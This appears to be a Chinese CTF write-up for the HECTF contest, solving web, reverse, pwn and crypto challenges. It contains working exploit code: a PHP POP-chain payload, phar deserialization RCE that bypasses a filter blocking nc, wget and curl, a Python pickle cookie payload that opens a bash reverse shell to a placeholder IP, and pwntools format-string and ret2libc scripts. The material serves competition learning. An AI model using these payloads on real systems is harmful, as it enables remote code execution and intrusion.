public_ccc = &#x27;?&#x27; public_eee = D() public_aaa = &#x27;?&#x27;class B: public_str = C() public_huang = &#x27;?&#x27; class A: public_file = B()print(quote(serialize(A())))# POST payload# data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A73%3A%22php%3A//filter/read%3Dconvert.base64-encode/resource%3D/ffflllllaaaaaaggggg.txt%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D# HECTF&#123;u_find_m# y_trulyself&#125; ​ cute_pipi观察页面，有图片上传点，url发现存在文件包含，利用伪协议读源码： index.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phperror_reporting(0);define(&#x27;FROM_INDEX&#x27;, 1);include(&#x27;class.php&#x27;);$file=$_POST[&#x27;file&#x27;];$show = empty($_GET[&#x27;show&#x27;]) ? &#x27;home&#x27; : $_GET[&#x27;show&#x27;];if(!is_string($show) || preg_match(&#x27;/\\.\\./&#x27;, $show) || preg_match(&#x27;/zip/i&#x27;,$show)) die(&#x27;Not this !!!&#x27;);ob_start(&#x27;ob_gzhandler&#x27;);function page_tshow($show) &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div id=&quot;header&quot;&gt; &lt;center&gt;&lt;a href=&quot;?show=home&quot; class=&quot;logo&quot;&gt;&lt;img src=&quot;images/logo.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;/center&gt; &lt;/div&gt; &lt;div id=&quot;body&quot;&gt;&lt;?php&#125;function fatal($msg) &#123;?&gt;&lt;div class=&quot;article&quot;&gt;&lt;h2&gt;Error&lt;/h2&gt;&lt;p&gt;&lt;?=$msg;?&gt;&lt;/p&gt;&lt;/div&gt;&lt;?phpexit(1);&#125;page_tshow($show);if(!(include $show . &#x27;.php&#x27;)) fatal(&#x27;no no no&#x27;);if(isset($file))&#123; if(file_exists($file)) echo $file.&quot; surely exists&quot;; else echo $file.&quot; dont exist&quot;;&#125;?&gt; home.php 12345678910111213&lt;?phpinclude &#x27;common.php&#x27;;?&gt;&lt;center&gt;&lt;div class=&quot;article&quot;&gt; &lt;h2&gt;Welcome to HECTF ！！！&lt;/h2&gt; &lt;p&gt; Click here to upload your file =&gt; &lt;a href=&quot;?show=upload&quot;&gt;传送门&lt;/a&gt; &lt;/p&gt;&lt;/div&gt;&lt;/center&gt; upload.php 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpinclude &#x27;common.php&#x27;;if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; isset($_FILES[&#x27;image&#x27;])) &#123; $fn = $_FILES[&#x27;image&#x27;][&#x27;tmp_name&#x27;]; $ft = $_FILES[&#x27;image&#x27;][&#x27;type&#x27;]; if(!is_uploaded_file($fn)) &#123; fatal(&#x27;uploaded file corrupted&#x27;); &#125; $array = array(&#x27;image/png&#x27;); if(!in_array($ft,$array))&#123; fatal(&quot;No, I want png picture ᵕ᷄ι ̠ᵕ᷅&quot;); &#125; $imagekey = create_image_key(); move_uploaded_file($fn, &quot;uploads/$imagekey.png&quot;); header(&quot;Location: ?show=show&amp;imagekey=$imagekey&quot;);&#125; else &#123;?&gt;&lt;center&gt;&lt;div class=&quot;article&quot;&gt; &lt;h2&gt;Plz Give me a file I want.&lt;/h2&gt; &lt;form enctype=&quot;multipart/form-data&quot; action=&quot;?show=upload&quot; method=&quot;POST&quot;&gt; &lt;label for=&quot;image&quot;&gt;ᵕ᷄ι ̠ᵕ᷅ &lt;/label&gt; &lt;input type=&quot;file&quot; id=&quot;image&quot; name=&quot;image&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Upload&quot; /&gt; &lt;/form&gt;&lt;/div&gt;&lt;/center&gt;&lt;?php&#125;?&gt; common.php 123456789101112131415161718192021&lt;?phpif(!defined(&#x27;FROM_INDEX&#x27;)) die();define(&#x27;MAX_IM_SIZE&#x27;, 100);function create_image_key() &#123; return sha1($_SERVER[&#x27;REMOTE_ADDR&#x27;] . $_SERVER[&#x27;HTTP_USER_AGENT&#x27;] . time() . mt_rand());&#125;function load_image($imagekey) &#123; if(1 !== preg_match(&#x27;/[0-9a-f]&#123;40&#125;/&#x27;, $imagekey)) &#123; fatal(&#x27;Invalid image key.&#x27;); &#125; $im = imagecreatefrompng(&quot;uploads/&#123;$imagekey&#125;.png&quot;); if(!$im) &#123; fatal(&#x27;Failed to load image.&#x27;); &#125; return $im;&#125;?&gt; class.php 12345678910111213&lt;?phpclass HeCTF&#123; public $hectf; public $cmd; public function __destruct()&#123; if( isset($this-&gt;hectf) &amp;&amp; !preg_match(&#x27;/[0-9]/&#x27;,$this-&gt;hectf) &amp;&amp; intval($this-&gt;hectf)) if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;, $this-&gt;cmd))&#123; die(&#x27;No no no no no!&#x27;); &#125; exec($this-&gt;cmd); &#125;&#125; 审计源码，图片上传点+file_exists()函数+自定义HeCTF类，判断为文件上传+phar反序列化利用。 HeCTF类中RCE使用 tee 命令绕过过滤写文件。 构造phar文件： 12345678910111213141516&lt;?phpclass HeCTF&#123; public $hectf; public $cmd;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $o = new HeCTF(); $o-&gt;hectf = array(&#x27;x&#x27;);$o-&gt;cmd = &#x27;ls / | tee 1&#x27;;$phar-&gt;setMetadata($o); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); 将生成的phar文件改为png后缀上传，在index.php以POST方式传入file值，利用phar伪协议反序列化RCE： POST: file=phar://uploads/25c3a34d93227241d5dacc8eb84a80ef2aabeab1.png 读到flag文件名 /ffflllllaaaaggg，同样操作构造读flag内容的phar文件： 12345678910111213141516&lt;?phpclass HeCTF&#123; public $hectf; public $cmd;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $o = new HeCTF(); $o-&gt;hectf = array(&#x27;x&#x27;);$o-&gt;cmd = &#x27;cat /ffflllllaaaaggg | tee 1&#x27;;$phar-&gt;setMetadata($o);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); ​ 皮扣的商店进入页面发现可以点击按钮，但是没钱可用，点击时发现cookie是变化的。 cookie像base64，解码，结合题目可知为json的pickle序列化结果，反推一下： 12345678import picklefrom base64 import *enc = &quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;print(pickle.loads(b64decode(enc)))# &#123;&#x27;money&#x27;: 500, &#x27;history&#x27;: [], &#x27;anti_tamper_hmac&#x27;: &#x27;aa1ba4de55048cf20e0a7a63b7f8eb62&#x27;&#125; 可见使用了hmac哈希，无法爆破，但可以构造RCE代码序列化后放入cookie，点击按钮执行恶意代码，由于页面无结果回显，构造反弹shell代码： 12345678import base64import pickleclass A(object): def __reduce__(self): return (eval, (&quot;bash -c \\&quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1\\&quot;&quot;,))a = A()print(base64.b64encode(pickle.dumps(a))) 替换cookie后，点击按钮即可在vps getshell拿flag。 ​ Reverse贝斯变表base32，Cyberchef一把梭得到flag。 ​ apk 如何分析Apk呢 用jadx打开apk，在AndroidManifest.xml里发现： &lt;meta-data android:name=&quot;父拉哥&quot; android:value=&quot;付拉哥头&#123;Apktool_or_jadx&#125;&quot;/&gt; flag：HECTF&#123;Apktool_or_jadx&#125; ​ HelloIos 简单的ios 找到关键加密函数，简单异或还原flag。 ​ ezre easy reverse 加密逻辑很难看，利用IDA的findcrypt插件可以识别出存在SM4加密算法的关键参数数组。 利用动调找到SM4加密使用的128位key值，导出hex：AD763B4FCDCFD9251089FB0408A45F80，以及128bit密文，导出hex：D75CDA22176DD392A1A570915F66A61C。 找一个SM4算法的python脚本解密得到flag： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192class SM4Cipher: def __init__(self, key: bytes): if not len(key) == 16: raise ValueError(&quot;SM4 key must be length of 16. &quot;) self._key_r = self._generate_key(key) self.block_size = 16 def encrypt(self, plaintext: bytes): return self._do(plaintext, self._key_r) def decrypt(self, ciphertext: bytes): return self._do(ciphertext, self._key_r[::-1]) def _do(self, text: bytes, key_r: list): text_ = [0 for _ in range(4)] # 将 128bit 转化成 4x32bit for i in range(4): text_[i] = int.from_bytes(text[4 * i:4 * i + 4], &#x27;big&#x27;) for i in range(32): box_in = text_[1] ^ text_[2] ^ text_[3] ^ key_r[i] box_out = self._s_box(box_in) temp = text_[0] ^ box_out ^ self._rot_left(box_out, 2) ^ self._rot_left(box_out, 10) temp = temp ^ self._rot_left(box_out, 18) ^ self._rot_left(box_out, 24) text_ = text_[1:] + [temp] text_ = text_[::-1] # 结果逆序 # 将 4x32bit 合并成 128bit result = bytearray() for i in range(4): result.extend(text_[i].to_bytes(4, &#x27;big&#x27;)) return bytes(result) def _generate_key(self, key: bytes): &quot;&quot;&quot;密钥生成&quot;&quot;&quot; key_r, key_temp = [0 for _ in range(32)], [0 for _ in range(4)] FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc] CK = [0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279] # 将 128bit 拆分成 4x32bit for i in range(4): temp = int.from_bytes(key[4 * i:4 * i + 4], &#x27;big&#x27;) key_temp[i] = temp ^ FK[i] # 循环生成轮密钥 for i in range(32): box_in = key_temp[1] ^ key_temp[2] ^ key_temp[3] ^ CK[i] box_out = self._s_box(box_in) key_r[i] = key_temp[0] ^ box_out ^ self._rot_left(box_out, 13) ^ self._rot_left(box_out, 23) key_temp = key_temp[1:] + [key_r[i]] return key_r @staticmethod def _s_box(n: int): BOX = [0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62, 0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8, 0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1, 0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3, 0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51, 0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84, 0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48] result = bytearray() # 将 32bit 拆分成 4x8bit，依次进行S盒变换 for item in list(n.to_bytes(4, &#x27;big&#x27;)): result.append(BOX[item]) return int.from_bytes(result, &#x27;big&#x27;) @staticmethod def _rot_left(n, m): &quot;&quot;&quot;循环左移&quot;&quot;&quot; return ((n &lt;&lt; m) | (n &gt;&gt; (32 - m))) &amp; 0xFFFFFFFF key = bytes.fromhex(&quot;AD763B4FCDCFD9251089FB0408A45F80&quot;) # 128bit密钥sm4 = SM4Cipher(key)# 动调测试加密# plaintext = bytes.fromhex(&quot;0123456789abcdeffedcba9876543210&quot;) # 128bit明文# print(sm4.encrypt(plaintext).hex())# 解密c = bytes.fromhex(&quot;D75CDA22176DD392A1A570915F66A61C&quot;)print(sm4.decrypt(c).hex())# 6f2069d8ab245446d789590d2cfe20d6 ​ author’sB0x still ez 识别代码逻辑为RC4算法，key为 thiskey，提取密文hex为 C3F5E5E2EC17E52ACA03B6FDC1BC704410CDA6130B9A73060E4DDE95129CD946， Cyberchef解出flag：HECTF&#123;Th3CutW0rmF0rgiv3sTh3Pl0w&#125; ​ run分析代码逻辑，为8层8*8迷宫，其中0为可走方块，1为不可走方块，wsad为上下左右，u为下一层，n为上一层。 将8层01迷宫矩阵打印出来，从第一层 (0,0) 手动模拟走迷宫，得到路径 ssddssuuwwddndduuussdussasauudd，加上HECTF{}即为flag。 ​ 还原md5 MD5(flag) = 55a573c5ff5ae053ee7f165c6e972613 哈哈哈，逆去吧 HINTS: 注意，re题目md5的flag提交时不需要再套HECTF{} txt内容像是调用libsfdata.so计算md5过程汇编操作记录，既然是全过程，肯定有读入原始数据，以16进制存入寄存器或内存的痕迹，HECT的hex值”48454354“，注意是小端序，全局搜索 54434548，找到 r6=0x54434548 疑似读入寄存器操作，继续全局搜索 =&gt; r6=0x，有 123456789101112Line 44619: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x0 =&gt; r6=0x54434548Line 44624: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x4 =&gt; r6=0x444d5f46Line 44629: [23:49:43 082][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x8 =&gt; r6=0x31332b32Line 44634: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0xc =&gt; r6=0x39363636Line 44639: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x10 =&gt; r6=0x37313237Line 44644: [23:49:43 084][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x14 =&gt; r6=0x34393338Line 44649: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x18 =&gt; r6=0x43753059Line 44654: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x1c =&gt; r6=0x6f646e61Line 44659: [23:49:43 086][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x20 =&gt; r6=0x743f7431Line 44664: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x24 =&gt; r6=0x4b233964Line 44669: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x28 =&gt; r6=0x37705f6eLine 44674: [23:49:43 088][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x2c =&gt; r6=0x80775576 提取出r6的值hex转字符即为flag：HECTF_MD2+31666972178394Y0uCando1t?td9#Kn_p7vUw ​ Pwn签到先利用 \\x00 截断绕过 strcmp 比较，进入 system(&#39;vim -R&#39;) 的vim交互模式，再使用vim命令 :e 文件名 读取flag内容。 12345678910111213141516from pwn import *context.log_level=&#x27;debug&#x27;r = remote(&#x27;121.4.111.50&#x27;,32365)r.recvline()r.recvline()r.send(b&#x27;\\x00&#x27;)r.recvline()r.recvline()r.recvline()r.send(b&#x27;x&#x27;)r.sendline(b&#x27;:e flag&#x27;)r.interactive() 值得注意的是，由于进入vim命令会清空终端内容，在pwntools交互下读取的内容会被瞬间刷掉，可以将输出重定向到文件，获取到flag内容输出： python test.py &gt; output.txt ​ 真·签到 听说你还没签上到 int类型强制转换为char，当值为128~255时变成负数，模拟伪代码，在最大值2147483647附近尝试寻找所需数字： 12345678910111213#include &lt;stdio.h&gt;int main()&#123; unsigned int x = 2147483646-124; printf(&quot;%d\\n&quot;, x); int y = x; printf(&quot;%d\\n&quot;, (char)y); printf(&quot;%d\\n&quot;, (char)y&lt;-125); printf(&quot;%d\\n&quot;, y&gt;255); return 0;&#125; 2147483522满足条件，传入后getshell拿到flag。 ​ fmt程序开了PIE，gdb动调，利用格式化字符串漏洞泄露当前函数地址，再减去偏移得到程序基址，剩下的部分简单ret2libc即可。 1234567891011121314151617181920212223242526272829303132333435from pwn import *r = remote(&#x27;121.4.102.43&#x27;,31550)elf = ELF(&#x27;./fmt&#x27;)libc = ELF(&#x27;/root/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&#x27;)#gdb.attach(r,&#x27;b *$rebase(0x123a)&#x27;)r.recvline()r.send(b&#x27;%15$p&#x27;)pie_base = eval(r.recv(14))-0x123aprint(hex(pie_base))pop_rdi = pie_base+0x1333pop_rsi_r15 = pie_base+0x1331ret = pie_base+0x101aputs_got = pie_base+elf.got.putsputs_plt = pie_base+elf.plt.putsget = pie_base+0x12abpl = b&#x27;a&#x27;*(0x10+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(get)r.sendline(pl)puts_addr = u64(r.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))libc_base = puts_addr-libc.sym.putsprint(hex(libc_base))system = libc_base+libc.sym.systembinsh = libc_base+libc.search(b&#x27;/bin/sh\\x00&#x27;).__next__()pl = b&#x27;a&#x27;*(0x10+8)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(0)*2+p64(system)+p64(get)print(len(pl))r.sendline(pl)r.interactive() ​ Crypto流动的音符txt内为音符加密，使用在线解密工具解密得到flag。 ​ matrix出题失误，源码泄露拿到flag。 ​ ezrsa 123456789101112131415161718192021from Crypto.Util.number import *from secret import flagflag = b&#x27;xxx&#x27;e = 114m = bytes_to_long(flag)p = getPrime(1024)q = getPrime(1024)t = getPrime(1024)n = p * q * tp_=pow(p,2,n)q_=pow(q,2,n)c = pow(m,e,n)print(&#x27;p_=&#x27;,p_)print(&#x27;q_=&#x27;,q_)print(&#x27;c=&#x27;,c)print(&#x27;n=&#x27;,n)#p_= 10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801#q_= 24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369#c= 946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340#n= 1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843 因 $p^2&lt;n,q^2&lt;n$，可直接开放求得 $p,q$ 及 $r$。 又 $\\gcd(e,\\varphi)=6$，利用 $\\gcd(\\cfrac{e}{6},\\varphi)=1$ 先常规RSA计算出 $m^6$ 再开方即可。 12345678910111213141516p_ = q_ = c = n = import gmpy2p = gmpy2.iroot(p_,2)[0]q = gmpy2.iroot(q_,2)[0]r = n//(p*q)f = (p-1)*(q-1)*(r-1)e = 114d = inverse_mod(e//6,f)mm = pow(c,d,n)m = gmpy2.iroot(mm,6)[0]print(bytes.fromhex(hex(m)[2:]))# b&#x27;HECTF&#123;Congratulation!!you_find_flag&#125;&#x27; ​ rsa2 123456789101112131415161718192021222324252627282930313233from Crypto.Util.number import *import sympyimport randomimport mathfrom secret import flag, hint, e1def mygenerate(): while True: p = getPrime(512) if p % 8 == 5: break g = p-random.randint(1 &lt;&lt; 13, 1 &lt;&lt; 15) q = sympy.nextprime(math.gamma(g+1) % p) return p, g, qp, g, q = mygenerate()n = p*qe2 = 65537m1 = bytes_to_long(flag)m2 = bytes_to_long(hint)c1 = pow(m1, e1, p)c2 = pow(m2, e2, n)print(&#x27;p =&#x27;+str(p))print(&#x27;g =&#x27;+str(g))print(&#x27;c1 =&#x27;+str(c1))print(&#x27;c2 =&#x27;+str(c2))&#x27;&#x27;&#x27;p =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909g =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766c1 =6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528c2 =11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627&#x27;&#x27;&#x27; 素因子的生成函数中， $q=\\text{nextprime}(\\Gamma(g+1) \\bmod p)=\\text{nextprime}(g! \\bmod p)=\\text{nextprime}((p-r)! \\bmod p)$ 结合威尔逊定理 $(p-2)! \\equiv 1 \\pmod p$，有 $q = \\text{nextprime}(\\prod\\limits_{k=2}^{r-1}(p-k)^{-1} \\bmod p)$ 求出 $p,q$ ，RSA解密得hint：$e_1=2$，再解密得 $m$。 1234567891011121314151617181920212223242526272829import sympyimport mathp =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909g =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766c1 =6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528c2 =11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627r = p-gq = 1for k in range(2,r): q = q*inverse_mod(p-k,p)%pq = sympy.nextprime(q)n = p*qe2 = 65537f = (p-1)*(q-1)d2 = inverse_mod(e2,f)m2 = pow(c2,d2,n)hint = bytes.fromhex(hex(m2)[2:])print(hint)# b&#x27;Here, e1=2, think about whether you can still use rsa to solve problems&#x27;e1 = 2P.&lt;x&gt; = PolynomialRing(Zmod(p))f = x ^ e1 - c1x = f.monic().roots()[1][0]flag= bytes.fromhex(hex(x)[2:])print(flag)# b&#x27;HECTF&#123;Happy_120th_birthday_to_Hebei_Normal_University&#125;&#x27; ​ onebit 123456789101112131415161718192021222324252627282930313233import randomfrom Crypto.Util.number import *from secret import flagdef Le(n, p): return pow(n, (p - 1) // 2, p)def Encrypt(message, n, g): ciphertext = [] for i, m in enumerate(message): k = random.randint(1, 2**512) c = ((g**int(m)) * (k ** 2)) % n ciphertext.append(c) return ciphertextp = getPrime(512)q = getPrime(512)while True: g = getPrime(512) if Le(g, p) == p-1 and Le(g, q) == q-1: breakm = bytes_to_long(flag)m = str(bin(m))[2:]n = p*qc = Encrypt(m, n, g)f = open(&#x27;output.txt&#x27;, &#x27;w&#x27;)f.write(str(p)+&#x27;\\n&#x27;)f.write(str(g)+&#x27;\\n&#x27;)f.write(str(c))f.close() 加密结果 $c=g^mk^2$，符合GM同态加密系统，分别判断 $c_i$ 是否为基于模 $p$ 的二次剩余即可： 12345678910111213141516from Crypto.Util.number import long_to_bytesimport gmpy2p = 10314655380768703978472206709958842273413011533146844672390572314617934317138270085463277616223314361910177207125628813385040318943783776184128231730068517g = 8263101522955373984025637723346797526375555424855735493538626380254785750558737652925053637878963928060840011944043285344527052241847201267694354571887089c = plaintext = &#x27;&#x27;for k in c: cipher = int(k) if gmpy2.jacobi(cipher,p) == -1: plaintext += &#x27;1&#x27; else: plaintext += &#x27;0&#x27;print(long_to_bytes(int(plaintext,2)))# b&#x27;HECTF&#123;359dbb32-04d5d9c6-7d463ebc-741c7454&#125;&#x27; ​ mixture 12345678910111213p=235322474717419a=0b=8856682k=E = EllipticCurve(GF(p), [a, b])P = E.random_point()P.order()==pQ=k*Paes_key=kprint(&quot;P:&quot;,P)print(&quot;Q:&quot;,Q)#P=E(180571547161769,227820272156445)#Q=E(76765539897460,69715189045993) 1234567891011121314151617181920212223from Crypto.Cipher import AESimport base64aes_key = b&#x27;???&#x27;def pad(text): while len(text) % 16 != 0: text 